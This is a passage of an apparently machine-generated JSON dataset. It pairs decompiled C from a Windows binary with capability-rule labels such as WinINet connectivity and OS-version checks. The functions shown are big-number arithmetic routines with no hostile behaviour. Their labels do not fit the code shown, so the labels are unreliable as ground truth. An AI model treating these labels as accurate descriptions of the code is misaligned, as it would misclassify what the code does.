fcn.200278cb(*var_1ch, *var_10h, uVar5, arg_14h);\n                        var_44h = var_44h + -4;\n                        var_40h = var_40h + 1;\n                        *(*piVar3 + uVar5 * 4) = uVar8;\n                        iVar2 = uVar5 + 1;\n                        if (0 < iVar2) {\n                            piVar4 = *piVar3 + -4 + iVar2 * 4;\n                            do {\n                                if (*piVar4 != 0) break;\n                                iVar2 = iVar2 + -1;\n                                piVar4 = piVar4 + -1;\n                            } while (0 < iVar2);\n                        }\n                        piVar3[1] = iVar2;\n                        var_28h = var_40h;\n                        fcn.200275cc(&var_44h, &var_44h, piVar3);\n                        uVar9 = var_40h;\n                        arg_8h_00[1] = arg_8h_00[1] + (var_40h - var_28h);\n                        if (var_38h != 0) {\n                            arg_14h = arg_14h - 1;\n                            fcn.20027674(&var_44h, &var_44h, var_10h);\n                            arg_8h_00[1] = arg_8h_00[1] + (var_40h - uVar9);\n                        }\n                        puVar1 = var_8h + -1;\n                        var_20h = var_20h + -1;\n                        *var_8h = arg_14h;\n                        var_18h = var_2ch;\n                        iVar6 = var_20h;\n                        var_8h = puVar1;\n                    } while (var_20h != 0);\n                }\n                if (arg_ch != 0) {\n                    fcn.2002b6fc(arg_ch, arg_8h_00, var_30h);\n                    *(arg_ch + 0xc) = *(arg_10h + 0xc);\n                }\n                fcn.20025c80(arg_18h);\n                return 1;\n            }\n        }\n    }\ncode_r0x2002b2ca:\n    fcn.20025c80(arg_18h);\n    return 0;\n}\n",
        "token_count": 2345
    },
    "2002b332": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.2002b332(uint32_t **param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t **ppuVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    if (param_1[3] == NULL) {\n        ppuVar2 = param_1;\n        if (param_1[2] < param_1[1] + 1) {\n            ppuVar2 = fcn.2002456e(param_1, param_1[1] + 1);\n        }\n        if (ppuVar2 == NULL) {\n            return 0;\n        }\n        uVar3 = **param_1 + param_2;\n        iVar4 = 0;\n        **param_1 = uVar3;\n        if (uVar3 < param_2) {\n            do {\n                iVar4 = iVar4 + 1;\n                uVar3 = (*param_1)[iVar4] + 1;\n                (*param_1)[iVar4] = uVar3;\n            } while (uVar3 == 0);\n        }\n        if (param_1[1] <= iVar4) {\n            param_1[1] = param_1[1] + 1;\n        }\n        uVar1 = 1;\n    }\n    else {\n        param_1[3] = NULL;\n        uVar1 = fcn.2002b3bb(param_1, param_2);\n        if ((param_1[1] != NULL) && ((param_1[1] != 0x1 || (**param_1 != 0)))) {\n            param_1[3] = param_1[3] == NULL;\n            return uVar1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 395
    },
    "2002b3bb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.2002b3bb(uint32_t **param_1, uint32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    \n    puVar1 = param_1[1];\n    puVar4 = NULL;\n    uVar5 = 1;\n    if ((puVar1 == NULL) || (((puVar1 == 0x1 && (**param_1 == 0)) || (param_1[3] != NULL)))) {\n        param_1[3] = NULL;\n        uVar5 = fcn.2002b332(param_1, param_2);\n    }\n    else {\n        if ((puVar1 != 0x1) || (puVar1 = *param_1,  param_2 <= *puVar1)) {\n            if (**param_1 < param_2) {\n                iVar3 = 0;\n                uVar2 = param_2;\n                do {\n                    *(iVar3 + *param_1) = *(iVar3 + *param_1) - uVar2;\n                    puVar4 = puVar4 + 1;\n                    iVar3 = puVar4 * 4;\n                    param_2 = 1;\n                    uVar2 = uVar5;\n                } while ((*param_1)[puVar4] == 0);\n            }\n            (*param_1)[puVar4] = (*param_1)[puVar4] - param_2;\n            if ((*param_1)[puVar4] != 0) {\n                return 1;\n            }\n            if (puVar4 != param_1[1] + -1) {\n                return 1;\n            }\n            param_1[1] = param_1[1] + -1;\n            return 1;\n        }\n        *puVar1 = param_2 - *puVar1;\n    }\n    param_1[3] = 0x1;\n    return uVar5;\n}\n",
        "token_count": 454
    },
    "2002b444": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.2002b444(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (param_1[1] != 0) {\n        if (param_2 == 0) {\n            fcn.20024717(param_1, 0);\n        }\n        else {\n            iVar1 = fcn.200278cb(*param_1, *param_1, param_1[1], param_2);\n            if (iVar1 != 0) {\n                piVar2 = param_1;\n                if (param_1[2] < param_1[1] + 1) {\n                    piVar2 = fcn.2002456e(param_1, param_1[1] + 1);\n                }\n                if (piVar2 == NULL) {\n                    return 0;\n                }\n                *(*param_1 + param_1[1] * 4) = iVar1;\n                param_1[1] = param_1[1] + 1;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 251
    },
    "2002b4a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2002b4a6(uint32_t **arg_8h, uint32_t **arg_ch)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t **ppuVar2;\n    uint32_t **ppuVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    \n    ppuVar2 = arg_ch;\n    ppuVar1 = arg_8h;\n    if (arg_8h == arg_ch) {\n        if (arg_8h[2] < arg_ch[1] + 1) {\n            arg_8h = fcn.2002456e(arg_8h, arg_ch[1] + 1);\n        }\n        if (arg_8h != NULL) goto code_r0x2002b4fb;\n    }\n    else {\n        arg_8h[3] = arg_ch[3];\n        ppuVar3 = arg_8h;\n        if (arg_8h[2] < arg_ch[1] + 1) {\n            ppuVar3 = fcn.2002456e(arg_8h, arg_ch[1] + 1);\n        }\n        if (ppuVar3 != NULL) {\n            arg_8h[1] = arg_ch[1];\ncode_r0x2002b4fb:\n            arg_ch = NULL;\n            arg_8h = NULL;\n            puVar4 = *ppuVar2;\n            puVar5 = *ppuVar1;\n            if (0 < ppuVar2[1]) {\n                do {\n                    uVar6 = *puVar4 * 2 | arg_ch;\n                    arg_ch = -(*puVar4 >> 0x1f);\n                    *puVar5 = uVar6;\n                    puVar4 = puVar4 + 1;\n                    puVar5 = puVar5 + 1;\n                    arg_8h = arg_8h + 1;\n                } while (arg_8h < ppuVar2[1]);\n                if (arg_ch != NULL) {\n                    *puVar5 = 1;\n                    ppuVar1 = ppuVar1 + 1;\n                    *ppuVar1 = *ppuVar1 + 1;\n                }\n            }\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 520
    },
    "2002b544": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2002b544(int32_t **arg_8h, int32_t **arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    int32_t **ppiVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    uint32_t uVar8;\n    \n    ppiVar3 = arg_ch;\n    piVar6 = arg_ch[1];\n    if ((piVar6 == NULL) || ((piVar6 == 0x1 && (**arg_ch == 0)))) {\n        fcn.20024717(arg_8h, 0);\n    }\n    else {\n        if (arg_ch != arg_8h) {\n            ppiVar4 = arg_8h;\n            if (arg_8h[2] < piVar6) {\n                ppiVar4 = fcn.2002456e(arg_8h, piVar6);\n            }\n            if (ppiVar4 == NULL) {\n                return 0;\n            }\n            arg_8h[1] = arg_ch[1];\n            arg_8h[3] = arg_ch[3];\n        }\n        ppiVar4 = arg_ch + 1;\n        arg_ch = NULL;\n        iVar5 = *ppiVar4 + -1;\n        piVar6 = *arg_8h;\n        piVar1 = *ppiVar3;\n        if (-1 < iVar5) {\n            puVar7 = piVar6 + iVar5;\n            do {\n                uVar2 = *((piVar1 - piVar6) + puVar7);\n                uVar8 = uVar2 >> 1 | arg_ch;\n                arg_ch = uVar2 << 0x1f;\n                *puVar7 = uVar8;\n                iVar5 = iVar5 + -1;\n                puVar7 = puVar7 + -1;\n            } while (-1 < iVar5);\n        }\n        if (0 < arg_8h[1]) {\n            piVar6 = *arg_8h + arg_8h[1] + -1;\n            do {\n                iVar5 = *piVar6;\n                piVar6 = piVar6 + -1;\n                if (iVar5 != 0) {\n                    return 1;\n                }\n                arg_8h[1] = arg_8h[1] + -1;\n            } while (0 < arg_8h[1]);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 559
    },
    "2002b6fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2002b6fc(uint32_t **arg_8h, uint32_t **arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t arg_ch_00;\n    uint32_t **ppuVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint32_t *puVar7;\n    uint32_t uVar8;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar6 = arg_10h + (arg_10h >> 0x1f & 0x1fU) >> 5;\n    uVar2 = arg_10h & 0x8000001f;\n    if (uVar2 < 0) {\n        uVar2 = (uVar2 - 1 | 0xffffffe0) + 1;\n    }\n    uVar1 = uVar2;\n    if ((arg_ch[1] < iVar6) || (arg_ch[1] == NULL)) {\n        fcn.20024717(arg_8h, 0);\n    }\n    else {\n        if (arg_8h == arg_ch) {\n            if (arg_10h == 0) {\n                return 1;\n            }\n        }\n        else {\n            arg_8h[3] = arg_ch[3];\n            arg_ch_00 = arg_ch[1] + (1 - iVar6);\n            ppuVar3 = arg_8h;\n            if (arg_8h[2] < arg_ch_00) {\n                ppuVar3 = fcn.2002456e(arg_8h, arg_ch_00);\n            }\n            if (ppuVar3 == NULL) {\n                return 0;\n            }\n        }\n        puVar7 = *arg_8h;\n        puVar5 = *arg_ch + iVar6;\n        puVar4 = arg_ch[1] - iVar6;\n        arg_8h[1] = puVar4;\n        if (uVar2 == 0) {\n            for (iVar6 = puVar4 + 1; 0 < iVar6; iVar6 = iVar6 + -1) {\n                *puVar7 = *puVar5;\n                puVar7 = puVar7 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n        else {\n            uVar2 = *puVar5;\n            if (1 < puVar4) {\n                arg_10h = puVar4 + -1;\n                do {\n                    puVar5 = puVar5 + 1;\n                    uVar8 = uVar2 >> (uVar1 & 0x1f);\n                    uVar2 = *puVar5;\n                    *puVar7 = uVar2 << (0x20 - uVar1 & 0x1f) | uVar8;\n                    puVar7 = puVar7 + 1;\n                    arg_10h = arg_10h + -1;\n                } while (arg_10h != 0);\n            }\n            *puVar7 = uVar2 >> (uVar1 & 0x1f);\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = 0;\n        if (0 < arg_8h[1]) {\n            puVar5 = *arg_8h + arg_8h[1] + -1;\n            do {\n                uVar2 = *puVar5;\n                puVar5 = puVar5 + -1;\n                if (uVar2 != 0) {\n                    return 1;\n                }\n                arg_8h[1] = arg_8h[1] + -1;\n            } while (0 < arg_8h[1]);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 858
    },
    "2002b81a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2002b81a(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t **ppiVar1;\n    int32_t **arg_8h_00;\n    int32_t **arg_8h_01;\n    uint arg_8h_02;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **arg_10h_00;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t **var_10h;\n    int32_t **var_ch;\n    int32_t var_8h;\n    int32_t **var_4h;\n    \n    var_8h = 0;\n    var_20h = 0;\n    fcn.20025c2c(arg_14h);\n    arg_8h_00 = fcn.20025c4b(arg_14h);\n    arg_8h_01 = fcn.20025c4b(arg_14h);\n    var_ch = fcn.20025c4b(arg_14h);\n    arg_8h_02 = fcn.20025c4b(arg_14h);\n    var_10h = fcn.20025c4b(arg_14h);\n    var_4h = fcn.20025c4b(arg_14h);\n    if (var_4h != NULL) {\n        var_8h = arg_8h;\n        if (arg_8h == 0) {\n            var_8h = fcn.20024546();\n        }\n        if (var_8h != 0) {\n            fcn.20024717(var_ch, 0);\n            fcn.20024717(var_4h, 1);\n            iVar2 = fcn.2002466f(arg_8h_00, arg_ch);\n            if ((iVar2 != 0) && (iVar2 = fcn.2002466f(arg_8h_01, arg_10h),  iVar2 != 0)) {\n                piVar3 = arg_8h_01[1];\n                var_14h = 1;\n                if (piVar3 != NULL) {\n                    do {\n                        arg_10h_00 = arg_8h_00;\n                        ppiVar1 = var_10h;\n                        if ((piVar3 == 0x1) && (arg_8h_00 = arg_10h_00,  **arg_8h_01 == 0)) break;\n                        iVar2 = fcn.2002af5f(arg_8h_02, var_10h, arg_10h_00, arg_8h_01, arg_14h);\n                        if ((iVar2 == 0) ||\n                           ((iVar2 = fcn.2002c08d(arg_10h_00, arg_8h_02, var_ch, arg_14h),  iVar2 == 0 ||\n                            (iVar2 = fcn.20027674(arg_10h_00, arg_10h_00, var_4h),  iVar2 == 0))))\n                        goto code_r0x2002b989;\n                        var_14h = -var_14h;\n                        var_10h = var_4h;\n                        var_4h = var_ch;\n                        piVar3 = ppiVar1[1];\n                        arg_8h_00 = arg_8h_01;\n                        arg_8h_01 = ppiVar1;\n                        var_ch = arg_10h_00;\n                    } while (piVar3 != NULL);\n                    if ((var_14h < 0) && (iVar2 = fcn.200275cc(var_4h, arg_10h, var_4h),  iVar2 == 0))\n                    goto code_r0x2002b989;\n                }\n                if ((arg_8h_00[1] == 0x1) &&\n                   ((**arg_8h_00 == 1 &&\n                    (iVar4 = fcn.2002b2da(var_8h, var_4h, arg_10h, arg_14h),  iVar2 = var_8h,  iVar4 != 0))))\n                goto code_r0x2002b998;\n            }\n        }\n    }\ncode_r0x2002b989:\n    iVar2 = var_20h;\n    if (arg_8h == 0) {\n        fcn.20024501(var_8h);\n    }\ncode_r0x2002b998:\n    var_20h = iVar2;\n    fcn.20025c80(arg_14h);\n    return var_20h;\n}\n",
        "token_count": 1065
    },
    "2002b9a7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2002b9a7(int32_t arg_8h, uint *arg_ch, int32_t arg_10h, uint *arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    \n    iVar1 = arg_10h;\n    puVar3 = arg_ch;\n    if (arg_10h < arg_18h) {\n        arg_10h = arg_18h;\n        arg_18h = iVar1;\n        arg_ch = arg_14h;\n        arg_14h = puVar3;\n    }\n    puVar3 = arg_8h + arg_10h * 4;\n    uVar2 = fcn.200278cb(arg_8h, arg_ch, arg_10h, *arg_14h);\n    arg_18h = arg_18h + -1;\n    *puVar3 = uVar2;\n    if (0 < arg_18h) {\n        puVar3 = puVar3 + 2;\n        arg_8h = arg_8h + 8;\n        arg_14h = arg_14h + 2;\n        do {\n            uVar2 = fcn.200276fc(arg_8h + -4, arg_ch, arg_10h, arg_14h[-1]);\n            puVar3[-1] = uVar2;\n            if (arg_18h + -1 < 1) {\n                return;\n            }\n            uVar2 = fcn.200276fc(arg_8h, arg_ch, arg_10h, *arg_14h);\n            *puVar3 = uVar2;\n            if (arg_18h + -2 < 1) {\n                return;\n            }\n            uVar2 = fcn.200276fc(arg_8h + 4, arg_ch, arg_10h, arg_14h[1]);\n            puVar3[1] = uVar2;\n            if (arg_18h + -3 < 1) {\n                return;\n            }\n            uVar2 = fcn.200276fc(arg_8h + 8, arg_ch, arg_10h, arg_14h[2]);\n            puVar3[2] = uVar2;\n            puVar3 = puVar3 + 4;\n            arg_8h = arg_8h + 0x10;\n            arg_14h = arg_14h + 4;\n            arg_18h = arg_18h + -4;\n        } while (0 < arg_18h);\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "2002ba8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2002ba8c(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    int32_t arg_14h_00;\n    int32_t iVar9;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    arg_14h_00 = arg_14h / 2;\n    if (arg_14h == 8) {\n        fcn.20027df4(arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    if (arg_14h < 0x10) {\n        fcn.2002b9a7(arg_8h, arg_ch, arg_14h, arg_10h, arg_14h);\n        return;\n    }\n    iVar9 = arg_14h_00 * 4;\n    iVar7 = iVar9 + arg_ch;\n    iVar5 = fcn.20024a02(arg_ch, iVar7, arg_14h_00);\n    bVar4 = false;\n    bVar3 = false;\n    arg_10h_00 = iVar9 + arg_10h;\n    iVar6 = fcn.20024a02(arg_10h_00, arg_10h, arg_14h_00);\n    // switch table (9 cases) at 0x2002bd4c\n    switch(iVar6 + 4 + iVar5 * 3) {\n    case 0:\n        fcn.20027d43(arg_18h, iVar7, arg_ch, arg_14h_00);\n        iVar5 = arg_10h;\n        iVar6 = arg_10h_00;\n        break;\n    case 1:\n    case 3:\n    case 4:\n    case 5:\n    case 7:\n        bVar3 = true;\n        goto code_r0x2002bba2;\n    case 2:\n        fcn.20027d43(arg_18h, iVar7, arg_ch, arg_14h_00);\n        iVar5 = arg_10h_00;\n        iVar6 = arg_10h;\n        goto code_r0x2002bb5a;\n    case 6:\n        fcn.20027d43(arg_18h, arg_ch, iVar7, arg_14h_00);\n        iVar5 = arg_10h;\n        iVar6 = arg_10h_00;\ncode_r0x2002bb5a:\n        fcn.20027d43(iVar9 + arg_18h, iVar5, iVar6, arg_14h_00);\n        bVar4 = true;\n        goto code_r0x2002bba2;\n    case 8:\n        fcn.20027d43(arg_18h, arg_ch, iVar7, arg_14h_00);\n        iVar5 = arg_10h_00;\n        iVar6 = arg_10h;\n        break;\n    default:\n        goto code_r0x2002bba2;\n    }\n    fcn.20027d43(iVar9 + arg_18h, iVar5, iVar6, arg_14h_00);\ncode_r0x2002bba2:\n    if (arg_14h_00 == 4) {\n        var_4h = arg_18h + arg_14h * 4;\n        if (bVar3) {\n            sub.ntdll.dll_memset(var_4h, 0, 0x20);\n        }\n        else {\n            fcn.20029663(var_4h, arg_18h, arg_18h + 0x10);\n        }\n        fcn.20029663(arg_8h, arg_ch, arg_10h);\n        var_8h = arg_8h + arg_14h * 4;\n        fcn.20029663(var_8h, arg_ch + 0x10, arg_10h + 0x10);\n    }\n    else if (arg_14h_00 == 8) {\n        var_4h = arg_18h + arg_14h * 4;\n        if (bVar3) {\n            sub.ntdll.dll_memset(var_4h, 0, 0x40);\n        }\n        else {\n            fcn.20027df4(var_4h, arg_18h, arg_18h + 0x20);\n        }\n        fcn.20027df4(arg_8h, arg_ch, arg_10h);\n        var_8h = arg_8h + arg_14h * 4;\n        fcn.20027df4(var_8h, arg_ch + 0x20, arg_10h + 0x20);\n    }\n    else {\n        var_4h = arg_14h * 4;\n        if (bVar3) {\n            sub.ntdll.dll_memset(var_4h + arg_18h, 0, var_4h);\n        }\n        else {\n            fcn.2002ba8c(var_4h + arg_18h, arg_18h, iVar9 + arg_18h, arg_14h_00, arg_18h + arg_14h * 8);\n        }\n        var_4h = var_4h + arg_18h;\n        fcn.2002ba8c(arg_8h, arg_ch, arg_10h, arg_14h_00, arg_18h + arg_14h * 8);\n        var_8h = arg_8h + arg_14h * 4;\n        fcn.2002ba8c(var_8h, iVar7, arg_10h_00, arg_14h_00, arg_18h + arg_14h * 8);\n    }\n    var_8h = fcn.20027c53(arg_18h, arg_8h, var_8h, arg_14h);\n    if (bVar4) {\n        iVar7 = fcn.20027d43(var_4h, arg_18h, var_4h, arg_14h);\n        iVar7 = -iVar7;\n    }\n    else {\n        iVar7 = fcn.20027c53(var_4h, var_4h, arg_18h, arg_14h);\n    }\n    var_8h = var_8h + iVar7;\n    iVar7 = fcn.20027c53(iVar9 + arg_8h, iVar9 + arg_8h, var_4h, arg_14h);\n    uVar1 = var_8h + iVar7;\n    if (uVar1 != 0) {\n        puVar8 = arg_8h + (arg_14h_00 + arg_14h) * 4;\n        uVar2 = *puVar8;\n        *puVar8 = uVar2 + uVar1;\n        if (uVar2 + uVar1 < uVar1) {\n            do {\n                puVar8 = puVar8 + 1;\n                uVar1 = *puVar8;\n                *puVar8 = uVar1 + 1;\n            } while (uVar1 + 1 == 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 1695
    },
    "2002bd70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.2002bd70(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t arg_10h_00;\n    uint32_t uVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t *puVar9;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = arg_18h;\n    if (arg_18h < 8) {\n        fcn.2002b9a7(arg_8h, arg_ch, arg_14h + arg_18h, arg_10h, arg_14h + arg_18h);\n        return;\n    }\n    iVar7 = arg_ch + arg_18h * 4;\n    iVar4 = fcn.20024a02(arg_ch, iVar7, arg_18h);\n    bVar2 = false;\n    arg_10h_00 = arg_10h + arg_18h * 4;\n    iVar5 = fcn.20024a02(arg_10h_00, arg_10h, arg_18h);\n    uVar6 = iVar5 + iVar4 * 3;\n    if (uVar6 < 0xfffffffd) {\n        if (uVar6 == 0xfffffffc) {\n            fcn.20027d43(arg_1ch, iVar7, arg_ch, arg_18h);\n            iVar4 = arg_10h;\n            iVar5 = arg_10h_00;\n        }\n        else {\n            if ((uVar6 < 2) || (uVar6 == 2)) goto code_r0x2002be32;\n            if ((uVar6 != 3) && (uVar6 != 4)) goto code_r0x2002be6b;\n            fcn.20027d43(arg_1ch, arg_ch, iVar7, arg_18h);\n            iVar4 = arg_10h_00;\n            iVar5 = arg_10h;\n        }\n        fcn.20027d43(arg_1ch + arg_18h * 4, iVar4, iVar5, arg_18h);\n    }\n    else {\n        if ((uVar6 == 0xfffffffd) || (uVar6 == 0xfffffffe)) {\n            fcn.20027d43(arg_1ch, iVar7, arg_ch, arg_18h);\n            iVar4 = arg_10h_00;\n            iVar5 = arg_10h;\n        }\n        else {\n            if (uVar6 != 0xffffffff) goto code_r0x2002be6b;\ncode_r0x2002be32:\n            fcn.20027d43(arg_1ch, arg_ch, iVar7, arg_18h);\n            iVar4 = arg_10h;\n            iVar5 = arg_10h_00;\n        }\n        fcn.20027d43(arg_1ch + arg_18h * 4, iVar4, iVar5, arg_18h);\n        bVar2 = true;\n    }\ncode_r0x2002be6b:\n    if (arg_18h == 8) {\n        var_10h = arg_1ch + 0x40;\n        fcn.20027df4(var_10h, arg_1ch, arg_1ch + 0x20);\n        fcn.20027df4(arg_8h, arg_ch, arg_10h);\n        var_ch = arg_8h + 0x40;\n        fcn.2002b9a7(var_ch, arg_ch + 0x20, arg_14h, arg_10h + 0x20, arg_14h);\n        sub.ntdll.dll_memset(arg_8h + (arg_14h * 2 + 0x10) * 4, 0, arg_14h * -8 + 0x40);\n    }\n    else {\n        iVar4 = arg_1ch + arg_18h * 0x10;\n        var_ch = arg_18h * 8;\n        var_10h = var_ch + arg_1ch;\n        fcn.2002ba8c(var_10h, arg_1ch, arg_1ch + arg_18h * 4, arg_18h, iVar4);\n        fcn.2002ba8c(arg_8h, arg_ch, arg_10h, arg_18h, iVar4);\n        iVar5 = arg_18h / 2;\n        iVar8 = arg_14h - iVar5;\n        if (iVar8 == 0) {\n            fcn.2002ba8c(var_ch + arg_8h, iVar7, arg_10h_00, iVar5, iVar4);\n            sub.ntdll.dll_memset(arg_8h + (arg_18h * 2 + iVar5 * 2) * 4, 0, var_ch + iVar5 * -8);\n        }\n        else if (iVar8 < 1) {\n            iVar8 = var_ch + arg_8h;\n            sub.ntdll.dll_memset(iVar8, 0, var_ch);\n            if (arg_14h < 0x10) {\n                fcn.2002b9a7(iVar8, iVar7, arg_14h, arg_10h_00, arg_14h);\n            }\n            else {\n                do {\n                    iVar5 = iVar5 / 2;\n                    if (iVar5 < arg_14h) {\n                        fcn.2002bd70(iVar8, iVar7, arg_10h_00, arg_14h - iVar5, iVar5, iVar4);\n                        goto code_r0x2002c00d;\n                    }\n                } while (iVar5 != arg_14h);\n                fcn.2002ba8c(iVar8, iVar7, arg_10h_00, iVar5, iVar4);\n            }\n        }\n        else {\n            fcn.2002bd70(var_ch + arg_8h, iVar7, arg_10h_00, iVar8, iVar5, iVar4);\n            sub.ntdll.dll_memset(arg_8h + (arg_18h * 2 + arg_14h * 2) * 4, 0, var_ch + arg_14h * -8);\n        }\ncode_r0x2002c00d:\n        var_ch = var_ch + arg_8h;\n    }\n    iVar7 = fcn.20027c53(arg_1ch, arg_8h, var_ch, arg_18h * 2);\n    if (bVar2) {\n        arg_18h = fcn.20027d43(var_10h, arg_1ch, var_10h, arg_18h * 2);\n        arg_18h = -arg_18h;\n    }\n    else {\n        arg_18h = fcn.20027c53(var_10h, var_10h, arg_1ch, arg_18h * 2);\n    }\n    arg_18h = iVar7 + arg_18h;\n    iVar7 = arg_8h + iVar3 * 4;\n    iVar7 = fcn.20027c53(iVar7, iVar7, var_10h, iVar3 * 2);\n    uVar6 = arg_18h + iVar7;\n    if (uVar6 != 0) {\n        puVar9 = arg_8h + iVar3 * 0xc;\n        uVar1 = *puVar9;\n        *puVar9 = uVar1 + uVar6;\n        if (uVar1 + uVar6 < uVar6) {\n            do {\n                puVar9 = puVar9 + 1;\n                uVar6 = *puVar9;\n                *puVar9 = uVar6 + 1;\n            } while (uVar6 + 1 == 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 1845
    },
    "2002c08d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
